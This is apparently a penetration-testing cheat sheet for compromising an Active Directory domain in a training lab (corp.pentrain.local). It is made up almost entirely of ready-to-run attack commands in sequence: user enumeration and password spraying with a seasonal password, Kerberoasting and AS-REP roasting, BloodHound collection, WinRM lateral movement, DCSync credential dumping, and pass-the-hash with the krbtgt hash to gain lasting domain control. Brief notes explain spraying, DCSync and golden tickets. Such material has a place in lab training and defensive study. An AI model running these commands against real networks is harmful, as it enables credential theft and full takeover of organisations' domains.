# Cheatsheet — Domain Takeover

## Targets

- **dc01 + dc02** (corps DCs), **ws01 + ws02** (workstations)
- entry: helpdesk user jholt — seasonal password

## Useful commands

```bash
# user enum + spray (slow — one password per window)
kerbrute userenum --dc <dc01> -d corp.pentrain.local users.txt
netexec smb <dc01> -u users.txt -p 'Summer2024!' --continue-on-success

# with any domain user:
bloodhound-python -u jholt -p 'Summer2024!' -d corp.pentrain.local -dc <dc01> -c all
impacket-GetUserSPNs 'corp.pentrain.local/jholt:Summer2024!' -request
impacket-GetNPUsers -no-pass -usersfile users.txt corp.pentrain.local/

# lateral + sync
evil-winrm -i <ws01> -u <user> -p '<pass>'
impacket-secretsdump 'corp.pentrain.local/admin:pass@<dc01>' -just-dc
impacket-psexec -hashes :<krbtgt-ntlm> corp.pentrain.local/krbtgt@<dc02>
```

## Concepts

- Spray = one password, many users — reverse of brute force, avoids lockout
- DCSync uses the DC's own replication protocol — legit requests, malicious intent
- krbtgt NTLM = golden tickets forever; the domain is owned, not just a box
